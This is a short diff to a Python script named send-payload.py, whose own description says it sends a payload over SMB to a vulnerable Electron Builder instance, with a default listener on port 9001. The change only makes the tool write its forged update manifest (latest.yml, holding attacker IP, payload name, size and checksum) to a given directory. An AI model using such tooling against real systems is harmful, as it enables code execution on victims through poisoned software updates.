@@ -88,7 +88,7 @@ def gen_checksum(filepath):
 
     return b64
 
-def gen_yaml(ip, payload, size, sum):
+def gen_yaml(ip, payload, size, sum, dir):
 
     print("\n=== Generating YAML File ===\n")
 
@@ -104,7 +104,11 @@ def gen_yaml(ip, payload, size, sum):
     
     print(yml_string)
 
-    return yml_string
+    with open(dir + "/latest.yml", 'a') as f:
+        f.write(yml_string)
+        f.close()
+
+    print("YAML saved at " + dir + "/latest.yml")
 
 def main():
     parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")
@@ -154,7 +158,7 @@ def main():
     
     payload_name, size, sum = get_payload(args, ip, port, path)
 
-    gen_yaml(ip, payload_name, size, sum)
+    gen_yaml(ip, payload_name, size, sum, arg_path)
 
 if __name__ == '__main__':
     main()
